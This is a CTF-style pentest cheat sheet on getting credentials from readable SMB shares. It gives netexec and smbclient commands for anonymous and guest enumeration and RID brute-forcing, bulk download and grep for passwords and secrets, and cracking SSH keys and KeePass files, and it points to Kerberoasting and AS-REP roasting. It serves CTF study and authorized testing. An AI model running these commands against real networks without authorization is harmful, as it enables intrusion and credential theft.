# SMB Shares To Credentials

Use when `445` is open and anonymous, guest, or low-priv access reveals files. Many challenge chains start here even when the final attack is Kerberoasting, AS-REP roasting, WinRM, or web admin access.

## Signals

- `smbclient -L` or `nxc smb --shares` shows readable shares.
- `IPC$` is readable, enabling RID/user enumeration.
- Files include scripts, backups, `.config`, KeePass, `web.config`, `id_rsa`, `NETLOGON`, or `SYSVOL`.

## Main Path

```bash
nxc smb target -u '' -p '' --shares
nxc smb target -u guest -p '' --shares
nxc smb target -u guest -p '' --rid
smbclient -L //target/ -N
smbclient //target/share -N
```

Download and search:

```bash
smbclient //target/share -N -c 'recurse;prompt off;mget *'
grep -RniE 'pass|password|pwd|secret|token|user|svc|admin|hash|key' .
find . -iname '*.kdbx' -o -iname '*config*' -o -iname '*.vbs' -o -iname '*.ps1'
```

## Options To Try

- If only `IPC$` is readable, run RID brute and build usernames.
- If names are found but no passwords, try AS-REP roasting, Kerberoasting after first credential, or careful username=password checks in CTF scope.
- If `SYSVOL` or `NETLOGON` is readable, search scripts and Group Policy Preference artifacts.
- If private keys appear, crack with `ssh2john`, then try SSH.
- If password manager files appear, use `keepass2john` and crack offline.
- After every new credential, re-run `--shares`, WinRM, RDP, MSSQL, and Kerberos checks.

## Study Examples

- 0xb0b Soupedecode 01: guest SMB -> RID brute -> user list -> valid credential -> Kerberoast.
- Cajac VulnNet Roasted: guest SMB -> shares -> usernames -> AS-REP -> `NETLOGON` credential leak.
